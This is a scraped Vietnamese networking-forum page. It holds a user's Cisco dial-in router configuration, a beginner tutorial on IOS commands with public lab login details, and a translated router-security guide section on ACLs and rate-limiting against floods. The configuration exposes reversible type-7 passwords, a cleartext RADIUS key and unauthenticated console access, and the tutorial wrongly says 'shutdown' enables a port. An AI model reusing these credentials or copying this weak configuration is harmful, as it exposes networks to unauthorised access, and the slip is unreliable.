				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/70/344.html#344,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">Tôi đang bận, không chi ra chỗ chưa được của nó cho huynh ! Tuy nhiên, dưới đây là cấu hình tôi lập cách đây 2 năm, đến bây giờ vẫn chạy tốt. Của tôi là con Router 2620, tôi có 16 đường line cho các dơn vị khác truy cập, sử dụng một số trượt duy nhất. Hiện tại tôi không dùng Radius, mà cấu hình về phần này là tôi thử nghiệm, tuy nhiên no cũng vẫn chạy ngon lành.<br/><br/><br/><br/><br/> version 12.1<br/> service timestamps debug uptime<br/> service timestamps log uptime<br/> service password-encryption<br/> !<br/> hostname nhuson_ras<br/> !<br/> logging buffered 4096 debugging<br/> no logging console<br/> aaa new-model<br/> aaa authentication login default local<br/> aaa authentication login no_radius local<br/> aaa authentication login no_authen none<br/> aaa authentication ppp default local<br/> aaa authorization network default none<br/> enable secret 5 478$1$9qtE$PY23478q3T768dp8I434y78KG4uO1.v71<br/> !<br/> username nhuson password 127 045FJKHD2581E08082F42<br/> username User1 password 7 131402UHDK1231305001D3A02F34<br/> username User2 password 7 03075sfCB1234d30603FGD012D59410A081110<br/> !<br/> !<br/> !<br/> !<br/> ip subnet-zero<br/> no ip finger<br/> !<br/> chat-script modemreset "" AT OK "AT&F1S0=1S1=1" OK<br/> chat-script tattiengmodem "" AT OK " ATm0" OK<br/> chat-script tatieng "" AT OK "ATs22=0" OK<br/> !<br/> !<br/> !<br/> interface FastEthernet0/0<br/> ip address 10.22.1.250 255.255.0.0<br/> duplex auto<br/> speed auto<br/> !<br/> !<br/> interface Group-Async1<br/> ip unnumbered FastEthernet0/0<br/> encapsulation ppp<br/> ip tcp header-compression passive<br/> no ip mroute-cache<br/> async default routing<br/> async mode interactive<br/> peer default ip address pool MPIPool<br/> no cdp enable<br/> ppp authentication pap<br/> group-range 33 48<br/> !<br/> ip local pool NhusonPool 10.22.1.201 10.22.1.216<br/> ip default-gateway 10.22.1.1<br/> ip classless<br/> ip route 0.0.0.0 0.0.0.0 10.22.1.1<br/> ip http server<br/> !<br/> radius-server host 10.22.1.12 auth-port 1645 acct-port 1646<br/> radius-server key nhusonmpi<br/> !<br/> line con 0<br/> exec-timeout 0 0<br/> login authentication no_authen<br/> transport input none<br/> line 33 40<br/> autoselect during-login<br/> autoselect ppp<br/> script startup modemreset<br/> script reset modemreset<br/> modem InOut<br/> modem autoconfigure type usr_courier<br/> transport input all<br/> stopbits 1<br/> speed 19200<br/> flowcontrol hardware<br/> line 41 48<br/> autoselect during-login<br/> autoselect ppp<br/> script startup modemreset<br/> script reset modemreset<br/> modem InOut<br/> modem autoconfigure type default<br/> transport input all<br/> stopbits 1<br/> speed 38400<br/> flowcontrol hardware<br/> line aux 0<br/> line vty 0 4<br/> exec-timeout 0 0<br/> password 7 111A1A16461F1B5D172F28367B27<br/> !<br/> no scheduler allocate<br/> end=================================<br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/31.html">Thảo luận mạng và thiết bị mạng</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/70.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/70/343.html#343,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">Tác giả: aTa100 ???<br/><br/> Router dùng chế độ dòng lệnh để tương tác với người quản trị. Chế độ dòng lệnh này được cung cấp bởi IOS, một dạng hệ điều hành dành riêng cho router (giống như DOS). IOS của router cung cấp các mode khác nhau để config. Có 3 mode chính là:<br/> - User EXEC mode<br/> - Privileged EXEC mode<br/> - Global configuration mode ( trong mode này còn có những mode nhỏ khác)<br/><br/> Xem hình để biết chi tiết các mode và các dấu nhắc hiển thị ở các mode<br/><br/><br/> Để config router chúng ta phải vào router và vào mode Global configuration.<br/><br/> Để có thể dễ dàng cho các bạn theo dõi, tôi sẽ đưa ra Lab để các bạn có thể thực hành luôn như. Ở trong Window chọn Start --&gt; Run gõ vào cmd (đối với Win NT/XP) hoặc command (win 9x/ME) và gõ enter. Sau đó gõ tiếp vào telnet r1r2.com và nhập vào r1r2ser , tiếp theo nhập tiếp vào cisco cho user và pass. Chúng ta đã có 2 router nối với trực tiếp thực sự để thực hành. Tuy nhiên cái này do là free nên khá chậm, các sẽ phải kiên nhẫn. Ngoài ra các bạn có thể dùng phần mềm của hãng Boson để thực hành cũng rất tốt<br/><br/> Sau khi đăng nhập xong bạn sẽ vào mode đầu tiên trong router là mode User EXEC mode. Tiếp tục vào mode Privilegde bằng lệnh enable<br/> Router&gt;enable<br/> Router#<br/> Sau đó vào mode Global để bắt đầu config<br/> Router#configure terminal<br/> Router(config)#<br/> Vào đến mode Global rồi thì chúng ta có thể config mọi thứ. Tôi sẽ giới thiệu từ những lệnh cơ bản.<br/><br/> - Đầu tiên là tên của Router: một router nên được đặt tên (đây là một trong những điều đầu tiên phải làm khi config router). Để đặt tên cho router bạn gõ lệnh sau:<br/> Router(config)#hostname Tokyo<br/> Tokyo(config)#<br/> Sau khi bạn gõ lệnh đó thì router sẽ chuyển dấu nhắc như dòng thứ 2. Đặt tên cho router giúp bạn có thể định vị được router nằm ở vị trí nào trong mạng của bạn, gợi cho bạn biết về vai trò của nó trong mạng.<br/> Lệnh hostname cú pháp đơn giản là: hostname &lt;ten Router&gt; . Xem chi tiết về các lệnh cơ bản ở đây: http://www.cisco.com/en/US/products/sw/ios...48.html#1018259<br/><br/> - Đặt password cho router: Password được đặt nhằm mục đích ngăn cản những truy cập không đúng quyền hạn vào router. Password thường được đặt cho những đường terminal ảo (virtual terminal lines) và đường console. Password cũng cho phép truy cập vào mode privileged EXEC để có thể thay đổi những cấu hình của router.<br/> Những lệnh để sau để đặt pass cho đường console: (có thể tùy chọn nhưng đề nghị nên đặt)<br/><br/> Router(config)#line console 0<br/> Router(config-line)#password &lt;password&gt;<br/> Router(config-line)#login<br/><br/> Password cũng nên đặt cho một hoặc nhiều đường terminal ảo (VTY) cho nhiều người sử dụng để họ có thể truy cập vào router bằng Telnet. Router của Cisco hỗ trợ 5 đường VTY được đánh số từ 0 đến 4. Lệnh sau để đặt pass cho VTY:<br/><br/> Router(config)#line vty 0 4<br/> Router(config-line)#password &lt;password&gt;<br/> Router(config-line)#login<br/><br/> Ngoài ra để vào mode privileged EXEC cần phải đặt enable pass. Enable pass có thể đặt với tùy chọn secret, với tùy chọn này thì pass sẽ được mã hóa. xem Lệnh sau:<br/><br/> Router(config)#enable password &lt;password&gt;<br/> Router(config)#enable secret &lt;password&gt;<br/><br/> Đôi khi pass có thể nhìn thấy ở dạng text khi xem cấu hình bằng lệnh show running-config và show startup-config . Để mở dịch vụ mã hóa pass không hiển thị dạng text khi gõ các lệnh trên dùng lệnh sau:<br/><br/> Router(config)#service password-encryption<br/><br/> Lệnh service password-encryption này sẽ mã hóa toàn bộ những pass được nhập vào khi bạn config router. Và lệnh enable secret &lt;password&gt; sử dụng thuật toán MD5 để mã hóa. Trong router thường default chế độ này là on.<br/><br/><br/><br/> - Lệnh Show: Có rất nhiều lệnh show có thể sử dụng để xem xét các thông tin trong router và để troubleshooting. Ở trong cả hai mode privileged EXEC và user EXEC mode lệnh show ? cung cấp danh sách các lệnh show có thể sử dụng. Dưới đây là một số lệnh show thường hay sử dụng:<br/> • show interfaces ? Hiển thị toàn bộ thông số trạng thái của interface (những interface này có thể là serial, ethernet...). Để xem một interface cụ thể thì gõ thêm các tên thiết bị đi kèm. Ví dụ: để xem thông số cổng serial của router gõ như sau<br/> Router#show interfaces serial 0/1<br/> • show controllers serial ? Hiển thị những thông số về phần cứng của cổng serial, dùng lệnh này ta có thể biết được cáp có được nối ở cổng này hay không, cáp là loại nào (DTE hay DCE) ...<br/> • show clock ? Xem thời gian đặt bởi router<br/> • show hosts ? Hiển thị danh sách tên host được đặt và địa chỉ của nó<br/> • show users ? Hiển thị toàn bộ những người đã kết nối tới router<br/> • show history ? Hiển thị những lệnh đã sử dụng<br/> • show flash ? Hiển thị thông tin về bộ nhới flash và những file của IOS được lưu ở đâu<br/> • show version ? Hiển thị thông tin về router và IOS đang chạy trong RAM<br/> • show ARP ? Xem bảng ARP của router<br/> • show protocol ? Xem trạng thái giao thức lớp 3 (up/down) của các interface<br/> • show startup-configuration ? Xem file cấu hình đã được lưu lại ở NVRAM<br/> • show running-configuration ? Xem file cấu hình đang chạy trong RAM<br/><br/> - Cấu hình cổng serial: Cổng serial có thể cấu hình từ console hoặc từ đường terminal ảo. Để cấu hình cổng serial hãy theo các bước sau:<br/><br/> - Vào mode global configuration<br/> - Vào tiếp mode interface<br/> - Đặt địa chỉ và subnet mask cho cổng<br/> - Thiết lập tốc độ clock (clock rate) nếu cống nối bằng cáp DCE. Bỏ qua bước này nếu cáp là loại cáp DTE.<br/> - Bật cổng lên<br/><br/> Mỗi một cổng serial phải có một địa chỉ IP và subnet mask cụ thể, đặt địa chỉ IP bằng lệnh sau:<br/><br/> Router(config)#interface serial 0/0<br/> Router(config-if)#ip address &lt;ip address&gt; &lt;netmask&gt;<br/><br/> Cổng serial đòi hỏi phải có tín hiệu clock để điều khiển thời gian để truyền thông tin. Trong mọi môi trường, thiết bị DCE như CSU sẽ cung cấp clock. Ở chế độ mặc định, router của cisco là thiết bị DTE nhưng chúng có thể cấu hình thành thiết bị DCE.<br/><br/> Ở kết nối trực tiếp trên cổng serial như trong môi trường lab, có từ hai router trở lên thì một router phải đóng vai trò là DCE và cung cấp tín hiệu clock cho router còn lại. Tín hiệu clock được thiết lập ở những tốc độ định sẵn bằng lệnh clock rate. Những tốc độ clock có thể thiết lập (tính theo bit/giây) là: 1200, 2400, 9600, 19200, 38400, 56000, 64000, 72000, 125000, 148000, 500000, 800000, 1000000, 1300000, 2000000, or 4000000. Tuy nhiên, một số tốc độ bit có thể không thiết lập được vì phụ thuộc vào khả năng của cổng serial.<br/><br/> Chế độ mặc định, những cổng serial ở trạng thái tắt hoặc bị cấm. Để bật hoặc cho phép những cổng này, phải dùng lệnh shutdown. Nếu cần tắt cổng đi để troubleshooting hoặc bảo dưỡng (maintenance) thì dùng lệnh shutdown.<br/><br/> Trong môi trường lab, clockrate sẽ được sử dụng là 56000. Xem ví dụ:<br/><br/> Router(config)#interface serial 0/0<br/> Router(config-if)#clock rate 56000<br/> Router(config-if)#no shutdown<br/><br/> Minh họa:<br/><br/><br/> Các bạn có thể tham khảo thêm ở đây: http://www.cisco.com/en/US/products/hw/mod...502.shtml#fifth<br/><br/> - Sửa đổi cấu hình: Nếu cấu hình cần phải được sửa đổi, hãy vào mode cần thiết và nhập những lệnh cần cho sự sửa đổi này. Ví dụ, nếu cần cho phép một interface: vào mode global configuration, vào mode interface, và gõ lệnh no shutdown.<br/><br/> Để kiểm tra những sự thay đổi này, dùng lệnh show running-config. Lệnh này hiển thị những cấu hình đang chạy trên router. Nếu những thông số cấu hình không chính xác, bạn có thể chỉnh lại theo các bước dưới đây:<br/> • Sử dụng lệnh no trước mỗi lệnh config.<br/> • Nạp lại hệ thống với file cấu hình từ NVRAM.<br/> • Copy file cấu hình từ TFTP server.<br/> • Xóa bỏ file cấu hình ban đầu với lệnh erase startup-config, sau đó khởi động lại router và vào chế độ setup.<br/><br/> Để lưu lại những thông số cấu hình vào file cấu hình ban đầu trong NVRAM, dùng lệnh sau ở chế độ privileged EXEC:<br/><br/> Router#copy running-config startup-config<br/><br/> Minh họa các bước khi sửa đổi cấu hình router:<br/><br/><br/> - Cấu hình cổng Ethernet: Cổng Ethernet có thể cấu hình từ cổng console hoặc từ kênh điểu khiển ảo. Cổng Ethernet yêu cầu phải có một địa chỉ IP và subnet cụ thể thì mới có thể gửi và nhận các gói tin trên mạng được. Để cấu hình cổng Ethernet bạn làm theo các bước sau:<br/><br/> 1. Vào mode global configuration<br/> 2. Vào tiếp mode interface<br/> 3. Đặt địa chỉ và subnet mask cho cổng<br/> 4. Bật cổng lên (ở chế độ mặc định cổng luôn ở trạng thái tắt hoặc bị cấm)<br/><br/> Các bạn có thể xem chi tiết các lệnh trong chế độ config cổng ethernet ở đây:<br/> http://www.cisco.com/en/US/products/sw/ iosswrel/ps1835/products_command_reference_ chapter09186a00800874b0.html#1017394<br/><br/> - Thêm ghi chú cho một cấu hình: Khi cấu hình một cổng (serial hoặc ethernet) của router bạn nên thêm phần chú thích vào để có thể dễ dàng troubleshooting mạng sau này. Cái này có vẻ như mất thời gian nhưng lúc mạng bị rối thì sẽ giúp ích cho bạn rất nhiều. Để thêm ghi chú cho một cổng các bạn vào mode config của cổng và sử dụng lệnh description. Các bước cụ thể như sau:<br/> 1. Vào mode global bằng lệnh configure terminal.<br/> 2. Vào tiếp mode config cổng (ví dụ là cổng Ethernet số 0) interface ethernet 0.<br/> 3. Dùng lệnh description để thêm ghi chú vào cổng đó<br/> 4. Thoái khỏi mode config cổng và trở về mode privileged EXEC bằng tổ hợp phím ctrl-Z.<br/> 5. Lưu những thay đổi cấu hình vào NVRAM (bộ nhớ của router) bằng lệnh sau copy running-config startup-config.<br/><br/> Đây là ví dụ ghi chú cho cổng Ethernet và Serial<br/><br/> interface Ethernet 0<br/> description LAN Engineering, Bldg.2<br/> interface serial 0<br/> description ABC network 1, Circuit 1<br/><br/> Xem chi tiết về lệnh description ở link sau:<br/> http://www.cisco.com/en/US/products/sw/ iosswrel/ps1835/products_command_reference_ chapter09186a008008000e.html#1017386<br/><br/> - Đặt banner - MOTD: Banner là một thông điệp hiển thị lúc bạn đăng nhập vào thông báo cho người sử dụng biết một số thông tin ví dụ như khi nào hệ thống sẽ tạm dừng. MOTD là viết tắt của chữ message-of-the-day, mọi kết nối từ xa đến router đều sẽ nhìn thấy motd. Đặt MOTD bạn phải vào mode config và dùng lệnh banner motd và sau đó là thông báo bạn muốn gửi nằm trong 2 kí tự #. Cụ thể các bước như sau:<br/><br/> 1. Vào mode global configuration với lệnh configure terminal.<br/> 2. Dùng lệnh banner motd # thông điệp của bạn #. để đặt motd<br/> Lưu lại cấu hình vừa đặt bằng lệnh copy running-config startup-config.<br/><br/> - Đặt host name – tên tắt: Trong trường hợp ở router bạn muốn kiểm tra một địa chỉ ip bằng ping hoặc muốn telnet đến một địa nào đó trong mạng, bạn phải gõ đủ địa chỉ ip bằng các con số vào. Điều đó có thể dễ bị nhầm lẫn khi gõ, IOS cung cấp một lệnh cho phép bạn gán một ip với một tên bằng chữ giống như cơ chế DNS trên mạng internet – chuyển ip thành domain name.<br/><br/> Để đặt tên host bạn dùng lệnh ip host tênhost địachỉip xem ví dụ dưới<br/><br/><br/> Lệnh đầu tiên sẽ gán cho tên Auckland ip là 172.16.32.1, thay vì bạn gõ ping 172.16.32.1 thì bạn chỉ phải gõ ping Auckland<br/><br/> Có thể đặt nhiều tên cùng một ip trên một router, những tên này chỉ có tác dụng trên router đó. Bạn có thể danh sách các host được đặt bằng lệnh ip host bằng lệnh show hosts<br/><br/> Ở trên là một số lệnh cơ bản để có thể cấu hình một router. Hy vọng sẽ có phần nào giúp các bạn hiểu được cách cơ bản để cấu hình router.<br/><br/> Tài liệu dựa vào phần lớn Chương 12 – Giáo trình CCNA của Cisco press.<br/><br/> 30/04/2004 nndzung – thân tặng các member của HVA<br/> Được chỉnh sửa bởi aTa100 </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/31.html">Thảo luận mạng và thiết bị mạng</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/69.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/69/342.html#342,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">Router Security Configuration Guide<br/> 4.3.5. Danh sách điều khiển truy cập nhanh<br/> Vài mô hình router của Cisco hỗ trợ danh sách điều khiển truy cập đã được biên dịch, gọi là “Turbo ACLs”, phần 12.1(6) của IOS, và sau đó. Nếu sử dụng danh sách điều khiển truy cập đã được biên dịch thì có thể giảm đáng kể ảnh hưởng đến quá trình thực thi khi danh sách dài. Để thiết lập chức năng này ta sử dụng lệnh chế độ cấu hình access-list compiled (Nếu IOS của bạn không hỗ trợ chức năng này thì nó sẽ phát sinh một tín hiệu lỗi nhưng vô hại) . Khi chức năng này đã được thiết lập thì IOS sẽ biên dịch tất cả các danh sách truy cập phù hợp vào bảng tra nhanh và vẫn giữ lại được các ngữ nghĩa ăn khớp nhau của chúng. Sau khi đã thiết lập các danh sách truy cập nhanh, ta có thể xem thông tin về chúng bằng lệnh show access-list compiled. Nếu bạn dùng danh sách truy cập với hơn 5 qui tắc để tăng tốc các mạch ghép nối thì bạn có thể dùng chức năng này để củng cố quá trình thực thi của router.<br/><br/> 4.3.6. Using Committed Access Rate<br/><br/> 4.3.6. Sử dụng Tốc độ truy cập được ràng buộc (CAR = Committed Access Rate)<br/> CAR là một dịch vụ của router cho phép các quản trị viên vài quyền điều khiển chỗ giao chung của lưu lượng vào và ra router. Bằng cách định cho các khối lưu lượng một lượng băng thông nhất định ta sẽ có thể điều chỉnh dữ liệu truyền qua router để bảo vệ lưu lượng yếu và hủy các lưu lượng quá mức băng thông cho phép đồng thời giới hạn được các lưu lượng giả tạo; tuy nhiên, công việc quan trọng nhất mà CAR làm được là giảm nhẹ các tác động gây tê liệt của các đợt tấn công DoS và các đợt tập trung chớp nhoáng. Bạn có thể dùng CAR để dành một phần băng thông của đường kết nối cho các lưu lượng quan trọng (1), hoặc để giới hạn lượng băng thông chiếm bởi một loại hình tấn công cụ thể (2). Trong trương hợp 2, có thể không phải lúc nào cũng cần giữ các qui tắc CAR nhưng phải đảm bảo lúc nào bạn cũng có thể sẵn sàng áp dụng nhanh chóng các qui tắc CAR khi phát hiện một đợt tấn công đang diễn ra. Phần này cung cấp tổng quan về CAR và một số ví dụ đơn giản.<br/><br/> CAR Command Syntax<br/><br/> Cấu trúc câu lệnh CAR<br/> Để cấu hình CAR bạn phải áp dụng các qui tắc về hạn chế tốc độ cho các mạch ghép nối nào mà bạn thiết lập ràng buộc lên việc sử dụng băng thông hay lưu lượng. Mỗi mạch ghép nối có thể có một tập hợp các qui tắc riêng biệt, có thứ tự theo các hướng nhận (in-bound) và gửi (out-bound). Cấu trúc tổng quát của nguyên tắc CAR ở dưới đây, đã được rút gọn.<br/><br/> rate-limit {input | output} [access-group [rate-limit] acl]<br/> token-bit-rate burst-normal-size burst-excess-size<br/> conform-action action exceed-action action<br/><br/> Để thêm một qui tắc cho một mạch kết nối, bạn chỉ cần nhập qui qui tắc đó trong chế độ thiết lập mạch kết nối, xem ví dụ bên dưới. Để hủy một qui tắc, nhập lại nó và thêm vào đằng trước từ khóa no. Để xem các qui luật CAR trên tất cả các mạch kết nối, sử dụng lệnh show interface rate-limit. Kết quả của lệnh sẽ là các qui tắc và vài số liệu thống kê lưu lượng về giới hạn tốc độ. Ví dụ đầu tiên dưới đây là một mẫu kết quả của lệnh này.<br/> Để biết thêm các câu lệnh của CAR, xem phần “IOS Quality of Service<br/> Solutions Command Reference” trong tài liệu documentation của IOS.<br/><br/> Defining Rules<br/><br/> Định nghĩa các qui tắc<br/> Mỗi một qui tắc hạn chế tốc độ được tạo bởi 3 phần: định nghĩa khối, các tham số nhóm mã thông báo token bucket, và các tiêu chuẩn thực thi.<br/><br/> Phần định nghĩa khối của qui tắc chỉ rõ loại lưu lượng (hoặc khối gói tin :packet aggregate) mà qui tắc áp dụng. Phần này phải bao gồm hướng của lưu lượng, và có thể bao gồm luôn fine-grained traffic selection được xác định với một danh sách điều khiển truy cập. Nếu qui tắc áp dụng cho các packet đi vào router thì sử dụng từ khóa input, trái lại dùng từ khóa output. Nếu phần này bao gồm mệnh đề access-group thì qui tắc CAR chỉ áp dụng cho lưu lượng phù hợp với danh sách truy cập. (Cũng có thể áp dụng các qui tắc CAR cho các gói tin bằng phần đầu của QoS QoS header và các tiêu thức criteria khác nhưng các thứ đó ngoài phạm vi của phần sơ lược này.) Nếu xuất hiện từ khóa rate-limit thì có nghĩa là khối đã được định rõ bằng một danh sách truy cập có giới hạn tốc độ, còn nếu không thì danh sách truy cập sẽ là một danh sách IP chuẩn hoặc mở rộng. Các danh sách truy cập giới hạn tốc độ xác định các khối dựa trên thứ tự trước sau của số IP hay các địa chỉ MAC.<br/> Phần thứ hai của lệnh rate-limit bao gồm 3 tham số nhóm mã thông báo. Chức năng CAR sử dụng một mô hình nhóm mã thông báo để xác định hoặc hạn chế băng thông lưu lượng. Mô hình này cho bạn một cách thuận tiện để qui định các ranh giới của trạng thái lưu lượng cho một khối. Mẫu nhóm mã thông báo cần 3 tham số cho việc xác lập, đó là: tốc độ bit của mã thông báo, kích thước thông thường của truyền loạt lưu lượng (tính bằng byte), và kích thước truyền loạt lưu lượng khi quá giới hạn. Tham số tốc độ bit của mã thông báo phải được xác định bằng bps (bits per second = số bit trong một giây) và phải lớn hơn 8000. Nó mô tả tổng quát tốc độ cho phép cho khối. Kích thước thông thường của truyền loạt, tính bằng byte, nói chung là kích thước của một phiên giao dịch lưu lượng chuẩn theo một hướng riêng rẽ. Đối với các giao thức đơn giản, như là ICMP hoặc DNS, nó có thể đơn giản là kích thước của một thông điệp chuẩn. Kích thước khi quá giới hạn của truyền loạt cho biết kích thước lớn nhất có thể có của truyền loạt lưu lượng, trước khi khối sử dụng hết băng thông của nó. Để biết chi tiết hơn về mô hình nhóm mã thông báo, xem [9].<br/><br/> Phần cuối của qui tắc bao gồm 2 tiêu chuẩn thực thi. Tiêu chuẩn thứ nhất hướng dẫn router cách xử lý gói tin khi khối phù hợp với phần băng thông, tiêu chuẩn thứ hai hướng dẫn router cách xử lí khi khối vượt quá băng thông cho phép của nó. Tùy thuộc vào phiên bản IOS của bạn, có thể có nhiều đến 9 hành động, 4 hành động thường dùng nhất được mô tả dưới đây.<br/> Cấu trúc làm việc của CAR Hành động được thực thi<br/> drop Hủy bỏ gói tin.<br/> transmit Truyền đi gói tin.<br/> continue Áp dụng qui tắc hạn chế tốc độ tiếp theo.<br/> set-prec-transmit prec Thiết lập thứ tự trước sau của IP thành prec và truyền đi gói tin.<br/> Các ví dụ về CAR<br/> Trong ví dụ đầu tiên, CAR được dùng để dành ra 10% của 10MB đường truyền theo chuẩn Ethernet cho lưu lượng SMTP gởi đi, và giới hạn lưu lượng tiếng ping ICMP gởi đi xuống dưới 1% của đường truyền. Phần còn lại của băng thông đường truyền sẽ hữu dụng cho lưu lượng SMTP còn lại và tất cả các lưu lượng IP khác. Thực tế, bạn có thể muốn bắt buộc giới hạn tốc độ cho cả ngoài lẫn trong ranh giới để bảo vệ lưu lượng SMTP quan trọng.<br/><br/> north(config)# no access-list 130<br/> north(config)# access-list 130 permit tcp any any eq smtp<br/> north(config)# no access-list 131<br/> north(config)# access-list 131 permit icmp any any echo<br/> north(config)# access-list 131 permit icmp any any echo-reply<br/> north(config)# interface eth0/0<br/> north(config-if)# rate-limit output access-group 130<br/> 1000000 25000 50000<br/> conform-action transmit exceed-action continue<br/> north(config-if)# rate-limit output access-group 131<br/> 16000 8000 8000<br/> conform-action continue exceed-action drop<br/> north(config-if)# rate-limit output 9000000 112000 225000<br/> conform-action transmit exceed-action drop<br/> north(config-if)# end<br/> north# show interface rate-limit<br/> Ethernet0/0<br/> Output<br/> matches: access-group 130<br/> params: 1000000 bps, 25000 limit, 50000 extended limit<br/> conformed 12 packets, 11699 bytes; action: transmit<br/> exceeded 0 packets, 0 bytes; action: continue<br/> last packet: 2668ms ago, current burst: 0 bytes<br/> last cleared 00:02:32 ago, conformed 0 bps, exceeded 0 bps<br/> matches: access-group 131<br/> params: 16000 bps, 2500 limit, 2500 extended limit<br/> conformed 130 packets, 12740 bytes; action: continue<br/> exceeded 255 packets, 24990 bytes; action: drop<br/> last packet: 7120ms ago, current burst: 2434 bytes<br/> last cleared 00:02:04 ago, conformed 0 bps, exceeded 990 bps<br/> matches: all traffic<br/> params: 9000000 bps, 112000 limit, 225000 extended limit<br/> conformed 346 packets, 27074 bytes; action: transmit<br/> exceeded 0 packets, 0 bytes; action: drop<br/> last packet: 7140ms ago, current burst: 0 bytes<br/> last cleared 00:01:40 ago, conformed 2000 bps, exceeded 0 bps<br/> north#<br/> In this second example, CAR is being used to throttle a TCP SYN flood attack.<br/><br/> Trong ví dụ 2 này, CAR đang được dùng để tiết lưu một đợt tấn công làm lụt (flood attack) vào TCP SYN.<br/><br/> north(config)# no access-list 160<br/> north(config)# access-list 160 deny tcp any any established<br/> north(config)# access-list 160 permit tcp any any syn<br/> north(config)# interface eth0/0<br/> north(config-if)# rate-limit input access-group 160<br/> 64000 8000 8000<br/> conform-action transmit exceed-action drop<br/> north(config-if)# end<br/> north#<br/> Qui tắc CAR trong ví dụ trên đơn giản hủy bỏ các gói TCP SYN đã quá giới hạn. Trong trường hợp này, lưu lượng đã được xác thực cũng có thể bị ảnh hưởng. Nếu bạn khoanh vùng được nguồn của đợt tấn công (có thể là một dải IP) thì bạn có thể bảo vệ có chọn lọc hơn bằng cách sát nhập vùng địa chỉ vào danh sách truy cập đã xác định của khối. Để xem thêm một ví dụ nữa về sử dụng CAR chống lại đợt tấn công từ chối dịch vụ DoS, xem [10].<br/> 4.3.7. Tham khảo<br/> [1] Chapman, D. Brent and Zwicky, Elizabeth D., Building Internet Firewalls,<br/> O’Reilly Associates, 1995.<br/> Cung cấp các thông tin hữu ích về cách lọc gói tin của các dịch vụ thường dùng, như là SMTP, FTP, Telnet, ...<br/> [2] Karrenberg, D., Moskowitz, B. and Rekhter, Y. “Address Allocation for Private<br/> Internets”, RFC 1918, February 1996.<br/> Mô tả cấu tạo địa chỉ IP cho mạng nội bộ tư nhân. Internet Assigned Numbers Authority đã dành 3 khối vùng địa chỉ IP sau cho mạng nội bộ tư nhân: 10.0.0.0 – 10.255.255.255, 172.16.0.0 – 172.31.255.255, và 192.168.0.0 – 192.168.255.255.<br/> [3] Held, G., and Hundley, K., Cisco Access List Field Guide, McGraw-Hill, 1999.<br/> Thông tin chi tiết về danh sách điều khiển truy cập và nhiều ví dụ về cấu trúc và cách sử dụng danh sách.<br/> [4] Held, G., and Hundley, K., Cisco Security Architectures, McGraw-Hill, 1999<br/> Một giới thiệu hữu ích về bảo mật router và về danh sách truy cập.<br/> [5] Cisco IOS Release 12.0 Security Configuration Guide, Cisco Press, 1999.<br/> Tham khảo và chỉ dẫn các tính năng bảo mật trong IOS 12.0. Bao gồm thông tin về Ngăn chặn TCP, bản thân danh sách truy cập, và danh sách truy cập động.<br/> [6] Ferguson, P. and Senie, D. “Network Ingress Filtering:<br/> Cung cấp tổng quan về lọc địa chỉ nguồn.<br/> [7] Cisco ISP Essentials, version 2.9, Cisco Systems, June 2001.<br/> Tập tin IOSEssentialsPDF.zip có ở<span class="link"> http://www.cisco.com/public/cons/isp/documents</span> .<br/> Chỉ dẫn chi tiết về thiết lập danh sách truy cập trong nhiều tình huống khác nhau, và một thảo luận hữu ích về các vấn đề cần xem xét đối với quá trình thực thi.<br/> [8] Sedayao, J., Cisco IOS Access Lists, O’Reilly Associates, 2001.<br/> Chỉ dẫn chi tiết về danh sách truy cập, bao gồm báo cáo về sử dụng danh sách truy cập bằng các giao thức định tuyến.<br/> [9] “Selecting Burst and Extended Burst Values for Class-based Policing”, Cisco<br/> Tech Note, Cisco Systems, Feb 2002.<br/> Có tại<span class="link"> http://www.cisco.com/warp/public/105/carburstvalues.html</span><br/> Mô tả mô hình nhóm mã thông báo CAR và tham số kích thước của truyền loạt khá chi tiết; chỉ dẫn cách chọn các giá trị hữu dụng.<br/> [10] “Using CAR During DOS Attacks”, Cisco Tech Note, Cisco Systems, 2001.<br/> Có tại<span class="link"> http://www.cisco.com/warp/public/63/car_rate_limit_icmp.html</span><br/> Xem qua một ví dụ chi tiết về CAR liên quan đến quá trình làm lụt (flooding) ICMP.<br/> 4.4. Định tuyến và giao thức định tuyến<br/> “Một phương thức là một mô tả hình thức của một tập hợp các qui tắc và qui ước chi phối cách trao đổi thông tin của các thiết bị trên một mạng máy tính”[5]. Phần này ta sẽ bàn luận 2 loại giao thức cơ bản, sẽ tập trung vào loại 2. Hai loại giao thức đó là:<br/> Giao thức tuyến định<br/> Đó là các giao thức có thể được định tuyến bằng một router. Giao thức tuyến định cho phép router diễn dịch chính xác mạng logic. Vài ví dụ về giao thức này là IP, IPX, Apple Talk, và DECnet.<br/> Giao thức định tuyến<br/> “Một giao thức định tuyến thu thập thông tin về các mạng hiện hữu và khoảng cách hoặc giá cả để liên lạc đến các mạng đó.”[7] Các giao thức này hỗ trợ giao thức tuyến định và được dùng để duy trì bảng định tuyến. Vài ví dụ về giao thức này là OSPF, RIP, BGP, và EIGRP.<br/> Tất 